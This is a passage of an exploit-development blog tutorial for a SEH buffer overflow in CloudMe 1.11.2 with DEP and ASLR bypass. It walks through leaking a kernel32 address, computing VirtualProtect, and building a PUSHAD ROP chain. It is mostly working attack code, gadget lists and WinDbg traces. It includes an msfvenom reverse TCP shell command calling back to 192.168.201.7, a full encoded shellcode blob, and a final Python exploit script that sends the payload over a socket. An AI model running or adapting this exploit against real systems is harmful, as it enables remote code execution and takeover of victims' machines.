eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=68ae4fe3 esp=0022d6a4 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf3:
68ae4fe3 59 pop ecx
0:000> 
eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ae4fe4 esp=0022d6a8 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf4:
68ae4fe4 c3 ret
0:000> 
eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ad422b esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!ZNK5QTime4hourEv+0x1b:
68ad422b 29c8 sub eax,ecx
0:000> 
eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ad422d esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core!ZNK5QTime4hourEv+0x1d:
68ad422d c3 ret
0:000> 
eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ae8a22 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core!ZNK12QEasingCurve4typeEv+0x2:
68ae8a22 8b00 mov eax,dword ptr [eax] ds:0023:0022ff8c=453c2f76
0:000> 
eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ae8a24 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core!ZNK12QEasingCurve4typeEv+0x4:
68ae8a24 c3 ret
</pre>

<p align="justify">
As seen above in red, after the <b>MOV EAX,DWORD PTR [EAX]</b> instruction is executed, the leaked kernel address is now loaded into EAX. Below we are doing the same demonstration with <b>Immunity Debugger</b> which shows the leaked <b>kernel32</b> address at the stack pane below:
</p>


<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/screenshot-2021-02-17-at-11.12.54-1.png" alt=""/>

Also we can see that the leaked <b>kernel32</b> address is loaded into EAX.


<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/screenshot-2021-02-17-at-11.22.36-1.png" alt=""/>


<p align="justify">
At this point we can calculate the <b>VirtualProtect</b> address using the leaked <b>kernel32</b> address from the stack.
</p>

* * *

### 6. From kernel32 to VirtualProtect

At this section we will see how to calculate the address of **VirtualProtect** in order to bypass DEP. First let’s find the address of **VirtualProtect** using **WinDBG.&nbsp;**


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:019> x kernel32!VirtualProtect 
762a20d8 kernel32!VirtualProtect (< no parameter info >)
</pre>


<p align="justify">
So, as we see above , the <b>VirtualProtect</b> address is <b>0x762a20d8</b>.&nbsp; Because of the address randomization the base address of <b>kernel32.dll</b> could change; however, the position of <b>VirtualProtect</b> relative to the leaked <b>kernel32</b> address <b>0x762f3c45</b> remains constant. Because <b>VirtualProtect</b> ( <b>0x762a20d8</b> ) is less than the leaked address ( <b>0x762f3c45</b> ), we can get the address of <b>VirtualProtect</b> into EAX while avoiding null bytes by adding a negative offset as follows:
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:019> ? kernel32!VirtualProtect - 0x762f3c45 
</pre>

<p align="justify">
The following gadgets have been found and used in order to load the <b>VirtualProtect</b> address dynamically into our exploit.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0x68a812c9 # POP EBP # RETN [Qt5Core.dll]
0xfffae493 # Offset
0x61ba8137 # ADD EAX,EBP # RETN [Qt5Gui.dll]
</pre>

<p align="justify">
At the first gadget, EBP is assigned with the hex value <b>0xfffae493</b>. Then, adding the two values from EAX and EBP will then give us the address of <b>VirtualProtect</b> and the result will be saved in EAX.
</p>

![VirtualProtect]({{ site.baseurl }}/assets/images/2021/02/virtualprotect.png)

<p align="justify">
Below is an updated PoC that implements the ROP gadgets showed before in order to calculate the <b>VirtualProtect</b> address dynamically and place it into EAX.
</p>

```python
import struct
import socket
import sys

target = "127.0.0.1"

payload_size = 1604

junk1 = "\x41" * payload_size

########################################################################

# Get kernel32 address from the stack
# 762a20d8 kernel32!VirtualProtect

rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll]
rop+= struct.pack('L',0x0385FF88) # Offset
rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x0362fffc) # Offset
rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]

# Calculate VirtualProtect relative to the leaked kernel32 address

rop+= struct.pack('L',0x68a812c9) # POP EBP # RETN [Qt5Core.dll]
rop+= struct.pack('L',0xfffae493) # Offset
rop+= struct.pack('L',0x61ba8137) # ADD EAX,EBP # RETN [Qt5Gui.dll]

########################################################################

buf = "\x42" * 351

nops = "\x90" * 16

junk2 = "\x43"*(2236 - len(rop) - len(nops) - len(buf) - len(junk1))

seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN

payload = junk1 + rop + nops + buf + junk2 + seh

try:
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target,8888))
   s.send(payload)
except Exception as e:
   print(sys.exc_value)
```

<p align="justify">
Below is a snippet of the debugging session illustrating the newly added ROP gadgets:
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> bp 0x6998fb2e
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
0:000> bl
0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
6998fb2e 81c46c070000 add esp,76Ch
0:000> t
eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
6998fb34 5b pop ebx
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
6998fb35 5e pop esi
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=00000000
eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
6998fb36 5f pop edi
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
6998fb37 5d pop ebp
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
6998fb38 c3 ret
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=699012c9 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network+0x12c9:
699012c9 5d pop ebp
0:000> 
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=699012ca esp=0022d69c ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Network+0x12ca:
699012ca c3 ret
0:000> 
eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=68a9559e esp=0022d6a0 ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!Z21qt_logging_to_consolev+0x8e:
68a9559e 95 xchg eax,ebp
0:000> 
eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=68a9559f esp=0022d6a0 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!Z21qt_logging_to_consolev+0x8f:
68a9559f c3 ret
0:000> 
eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
eip=68ae4fe3 esp=0022d6a4 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf3:
68ae4fe3 59 pop ecx
0:000> 
eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ae4fe4 esp=0022d6a8 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf4:
68ae4fe4 c3 ret
0:000> 
eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ad422b esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
Qt5Core!ZNK5QTime4hourEv+0x1b:
68ad422b 29c8 sub eax,ecx
0:000> 
eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ad422d esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core!ZNK5QTime4hourEv+0x1d:
68ad422d c3 ret
0:000> 
eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ae8a22 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core!ZNK12QEasingCurve4typeEv+0x2:
68ae8a22 8b00 mov eax,dword ptr [eax] ds:0023:0022ff8c=453c2f76
0:000> 
eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68ae8a24 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core!ZNK12QEasingCurve4typeEv+0x4:
68ae8a24 c3 ret
0:000> 
eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68a812c9 esp=0022d6b4 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core+0x12c9:
68a812c9 5d pop ebp
0:000> 
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll - 
eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=68a812ca esp=0022d6b8 ebp=fffae493 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Core+0x12ca:
68a812ca c3 ret
0:000> 
eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=61ba8137 esp=0022d6bc ebp=fffae493 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
Qt5Gui!ZN7QWindow4setXEi+0x77:
61ba8137 01e8 add eax,ebp
0:000> 
<span style="color:#ff0000;">eax=762a20d8</span> ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
eip=61ba8139 esp=0022d6bc ebp=fffae493 iopl=0 nv up ei pl nz na pe cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000207
Qt5Gui!ZN7QWindow4setXEi+0x79:
61ba8139 c3 ret
</pre>

<p align="justify">
As shown above in red, after executing the last gadget, the address of <b>VirtualProtect</b> ( <b>0x762a20d8</b> ) will be stored in the <b>EAX</b> register.
</p>

* * *

### 7. Bypassing DEP

<p align="justify">
This section shows how to bypass DEP by using <b>VirtualProtect</b> in order to set the access protection to <b>PAGE_EXECUTE_READWRITE</b> on the memory region containing the shellcode. The following parameters must be specified in order to successfully execute <b>VirtualProtect</b> :
</p>

```c
BOOL WINAPI VirtualProtect(
          __in   LPVOID lpAddress,
          __in   SIZE_T dwSize,
          __in   DWORD flNewProtect,
          __out  PDWORD lpflOldProtect
    );
```

<p align="justify">
In order to implement the ROP chain to bypass <b>DEP</b> we will use the <b>PUSHAD</b> technique as follows
</p>
- Registers **EAX** through **ESI** are populated with the **VirtualProtect** function parameters and the necessary padding (**EDI** and **EAX**)
- Registers will be pushed on the stack using the **PUSHAD** instruction.
- **VirtualProtect** will be executed to disable **DEP** for a specified memory region.

<p align="justify">
At this point we are about to create the ROP chain that will enforce DEP bypass.

The <b>PUSHAD</b> instruction&nbsp; <b>always</b> pushes all 8 general purpose registers onto the stack. A single <b>PUSHAD</b> instruction is equivalent to the following
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
Push EAX
Push ECX
Push EDX
Push EBX
Push ESP
Push EBP
Push ESI
Push EDI
</pre>

So, in our case the arguments of **VirtualProtect** will be pushed in stack using **PUSHAD** as follows.


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
Stack:
EAX (NOP)
ECX (lpflOldProtect)
EDX (flNewProtect)
EBX (dwSize)
ESP (lpAddress)
EBP (ReturnAddress)
ESI (VirtualProtect)
EDI (ROP NOP) 
</pre>

From **WinDbg** , using **mona.py** we can generate the ROP chain as follows


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> !load pykd.pyd
0:000> !py mona rop -n -o
[...]
</pre>


<p align="justify">
Unfortunately, the ROP chains generated with <b>mona.py</b> won't fit our needs, because some gadgets are missing. Nevertheless, we can still implement the ROP chain manually with the help of the generated gadgets from <b>mona.py</b>. Also, the <b>ROP chain</b> should be manually implemented, because we have already used some gadgets before, in order to dynamically load the <b>VirtualProtect</b> address, and this should cause changes to the sequence of the chain and also the sequence of the gadgets.
</p>


<p align="justify">
Also one missing gadget added to the chain ( <b>jmp esp</b> ) which has been produced by <b>ROPgadget</b> tool :
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll" --only "jmp" --depth 5 --badbytes "00"
</pre>

The following snippet shows the setup of **VirtualProtect** using ROP gadgets

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
# ROP - NOP
0x6d9c23ab # POP EDI # RETN [Qt5Sql.dll]
0x6d9c1011 # RETN [Qt5Sql.dll]

# ptr to VirtualProtect
0x61b63b3c # XCHG EAX, ESI # RETN 

# flNewProtect of 0x40
0x68d327ff # POP EAX # POP ECX # RETN [Qt5Core.dll]
0xffffffc0 # Value to negate, will become 0x00000040
0x41414141 # Filler
0x68cef5b2 # NEG EAX # RETN [Qt5Core.dll]
0x68b1df17 # XCHG EAX,EDX # RETN [Qt5Core.dll]

# dwSize of 0x201
0x68ae7ee3 # POP EAX # RETN [Qt5Core.dll]
0xfffffdff # Value to negate, will become 0x00000201
0x6d9e431a # NEG EAX # RETN [Qt5Sql.dll]
0x68aad07c # XCHG EAX,EBX # RETN [Qt5Core.dll]

# ReturnAddress
0x6d9c12c9 # POP EBP # RETN [Qt5Sql.dll]
0x6d9c12c9 # skip 4 bytes

# flOldProtect
0x6fe4dc57 # POP EAX # POP ECX # RETN 
0x90909090 # NOP 
0x68ee6b16 # &Writable location [Qt5Core.dll]

0x68ef1b07 # PUSHAD # RETN [Qt5Core.dll]

#lpAddress
0x64b4d6cd # JMP ESP [libwinpthread-1.dll]
</pre>


<p align="justify">
The first two lines above will align our stack after executes. To achieve this we will be filling <b>EDI</b> with a <b>ROP-NOP</b> as filler so the chain would continue working as intended.At line 3 the <b>ESI</b> register will have the address of <b>VirtualProtect</b>. At this point we have to remember that the <b>VirtualProtect</b> address, before assigned to <b>ESI</b> register,&nbsp; it was assigned to the EAX register, and that happened because of the gadgets we have used before in order to load the address dynamically. At lines 4 - 8 , the memory protection constant <b>0x40</b> (read-write privileges) will be put on <b>EAX</b> register and then into <b>EDX</b> in order to setup the <b>flNewProtect</b> argument. At lines 9 - 12 , we set up the size of the region whose access protection attributes are to be changed, in bytes. Here we choose to put <b>0x201</b> ( 513 bytes ). At lines 13 - 14 we set up the pointer to the location where <b>VirtualProtect</b> needs to return to. This will be the address of the shellcode on the stack. At lines 15 - 17 we set a pointer to variable that will receive the previous access protection value. At line 18 we push all general purpose registers on the stack and then at line 19 we jump to our shellcode.
</p>

* * *

### 8. Finalizing the Exploit

<p align="justify">
The following reverse TCP shellcode will be used in order to exploit the buffer overflow vulnerability.&nbsp;
</p>

From **msfvenom** we generate the reverse TCP shellcode :

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~</b></span># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread  -b "\x00" -f  python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x81\xf1\x20\xb2\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\xc3\xe2\xc2"
buf += b"\x47\x3f\xec\x81\xa8\xbf\xed\xe5\x21\x5a\xdc\x25\x55"
buf += b"\x2f\x4f\x96\x1d\x7d\x7c\x5d\x73\x95\xf7\x13\x5c\x9a"
buf += b"\xb0\x9e\xba\x95\x41\xb2\xff\xb4\xc1\xc9\xd3\x16\xfb"
buf += b"\x01\x26\x57\x3c\x7f\xcb\x05\x95\x0b\x7e\xb9\x92\x46"
buf += b"\x43\x32\xe8\x47\xc3\xa7\xb9\x66\xe2\x76\xb1\x30\x24"
buf += b"\x79\x16\x49\x6d\x61\x7b\x74\x27\x1a\x4f\x02\xb6\xca"
buf += b"\x81\xeb\x15\x33\x2e\x1e\x67\x74\x89\xc1\x12\x8c\xe9"
buf += b"\x7c\x25\x4b\x93\x5a\xa0\x4f\x33\x28\x12\xab\xc5\xfd"
buf += b"\xc5\x38\xc9\x4a\x81\x66\xce\x4d\x46\x1d\xea\xc6\x69"
buf += b"\xf1\x7a\x9c\x4d\xd5\x27\x46\xef\x4c\x82\x29\x10\x8e"
buf += b"\x6d\x95\xb4\xc5\x80\xc2\xc4\x84\xcc\x27\xe5\x36\x0d"
buf += b"\x20\x7e\x45\x3f\xef\xd4\xc1\x73\x78\xf3\x16\x73\x53"
buf += b"\x43\x88\x8a\x5c\xb4\x81\x48\x08\xe4\xb9\x79\x31\x6f"
buf += b"\x39\x85\xe4\x20\x69\x29\x57\x81\xd9\x89\x07\x69\x33"
buf += b"\x06\x77\x89\x3c\xcc\x10\x20\xc7\x87\xde\x1d\x0e\x50"
buf += b"\xb7\x5f\x90\x5e\xfc\xe9\x76\x0a\x12\xbc\x21\xa3\x8b"
buf += b"\xe5\xb9\x52\x53\x30\xc4\x55\xdf\xb7\x39\x1b\x28\xbd"
buf += b"\x29\xcc\xd8\x88\x13\x5b\xe6\x26\x3b\x07\x75\xad\xbb"
buf += b"\x4e\x66\x7a\xec\x07\x58\x73\x78\xba\xc3\x2d\x9e\x47"
buf += b"\x95\x16\x1a\x9c\x66\x98\xa3\x51\xd2\xbe\xb3\xaf\xdb"
buf += b"\xfa\xe7\x7f\x8a\x54\x51\xc6\x64\x17\x0b\x90\xdb\xf1"
buf += b"\xdb\x65\x10\xc2\x9d\x69\x7d\xb4\x41\xdb\x28\x81\x7e"
buf += b"\xd4\xbc\x05\x07\x08\x5d\xe9\xd2\x88\x7d\x08\xf6\xe4"
buf += b"\x15\x95\x93\x44\x78\x26\x4e\x8a\x85\xa5\x7a\x73\x72"
buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"
</pre>

<p align="justify">
Now lets finalize our Proof of Concept exploit script and see the registers pushed into the stack using <b>WinDbg</b> debugger. The final exploit will be as follows :
</p>

```python
# Exploit Title: CloudMe 1.11.2 - SEH/DEP/ASLR Buffer Overflow 
# Date: 2020-05-20
# Exploit Author: Xenofon Vassilakopoulos
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 7 Professional x86 SP1

# Steps to reproduce:
# 1. On your local machine start the CloudMe service.
# 2. change the reverse tcp shellcode using the IP and Port of your host using the following command
# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread -b "\x00\x0d\x0a" -f python
# 3. Run the python script.


import struct
import socket
import sys

target = "127.0.0.1"

################################################################

# Get kernel32 address from the stack
# 0022ff8c 77883c45 kernel32!BaseThreadInitThunk+0xe

rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll]
rop+= struct.pack('L',0x0385FF88) # Offset
rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x0362fffc) # Offset
rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]

# Calculate VirtualProtect relative to the leaked kernel32 address

rop+= struct.pack('L',0x68a812c9) # POP EBP # RETN [Qt5Core.dll]
rop+= struct.pack('L',0xfffae493) # Offset
rop+= struct.pack('L',0x61ba8137) # ADD EAX,EBP # RETN [Qt5Gui.dll]

###############################################################

# Setup VirtualProtect

# edi
rop+= struct.pack('L',0x6d9c23ab) # POP EDI # RETN [Qt5Sql.dll]
rop+= struct.pack('L',0x6d9c1011) # RETN (ROP NOP) [Qt5Sql.dll]

# esi
rop+= struct.pack('L',0x61b63b3c) # XCHG EAX, ESI # RETN # ptr to virtualprotect

# edx
rop+= struct.pack('L',0x68d327ff) # POP EAX # POP ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0xffffffc0) # Value to negate, will become 0x00000040
rop+= struct.pack('L',0x41414141) # Filler
rop+= struct.pack('L',0x68cef5b2) # NEG EAX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68b1df17) # XCHG EAX,EDX # RETN [Qt5Core.dll]

# ebx
rop+= struct.pack('L',0x68ae7ee3) # POP EAX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0xfffffdff) # Value to negate, will become 0x00000201
rop+= struct.pack('L',0x6d9e431a) # NEG EAX # RETN [Qt5Sql.dll]
rop+= struct.pack('L',0x68aad07c) # XCHG EAX,EBX # RETN [Qt5Core.dll]

# ebp
rop+= struct.pack('L',0x6d9c12c9) # POP EBP # RETN [Qt5Sql.dll]
rop+= struct.pack('L',0x6d9c12c9) # skip 4 bytes

# eax & ecx
rop+= struct.pack('L',0x6fe4dc57) # POP EAX # POP ECX # RETN 
rop+= struct.pack('L',0x90909090) # NOP 
rop+= struct.pack('L',0x68ee6b16) # &Writable location [Qt5Core.dll]

# push registers to stack
rop+= struct.pack('L',0x68ef1b07) # PUSHAD # RETN [Qt5Core.dll]

rop+= struct.pack('L',0x64b4d6cd) # JMP ESP [libwinpthread-1.dll]

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread -b "\x00" -f pythonLPORT=443 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
buf = b""
